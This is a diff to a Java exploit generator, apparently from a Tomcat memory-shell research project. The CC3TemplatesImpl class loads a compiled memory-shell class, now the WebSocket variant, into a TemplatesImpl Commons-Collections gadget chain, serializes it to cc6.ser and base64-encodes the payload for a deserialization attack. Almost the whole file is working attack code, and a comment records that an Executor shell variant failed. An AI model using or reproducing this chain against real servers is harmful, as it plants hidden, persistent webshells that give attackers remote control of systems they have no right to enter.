@@ -2,7 +2,6 @@ package org.example.tomcatmemshell;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -13,8 +12,10 @@ import org.apache.commons.collections.map.LazyMap;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Modifier;
+import java.net.URLEncoder;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -22,12 +23,14 @@ import java.util.Map;
 public class CC3TemplatesImpl {
     public static void main(String[] args) throws Exception {
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/servlet/ServletMemShell.class"));
-//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Generic/GenericTomcatMemShell3.class"));
+//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Generic/GenericTomcatMemShell4.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Filter/FilterMemShell.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/JNI/JNIMemShell.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Listener/ListenerMemShell.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Valve/ValveMemShell2.class"));
-        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Upgrade/UpgradeMemShell.class"));
+//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Upgrade/UpgradeMemShell.class"));
+//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Executor/ExecutorMemShell.class"));//Executor马复现失败，局限较大
+        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/WebSocket/WebSocketMemShell.class"));
         TemplatesImpl templatesClass = new TemplatesImpl();
         Field[] fields = templatesClass.getClass().getDeclaredFields();
         for (Field field : fields) {
@@ -64,8 +67,9 @@ public class CC3TemplatesImpl {
     }
     public static String readClassStr() throws IOException {
         byte[] code = Files.readAllBytes(Paths.get("cc6.ser"));
-        return Base64.encode(code);
-    }
+        String encodeString = new String(Base64.getEncoder().encode(code));
+        byte[] bytes= Base64.getDecoder().decode(encodeString);
+        return encodeString;}
     public static void serialize(Object obj) throws Exception {
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
         oos.writeObject(obj);
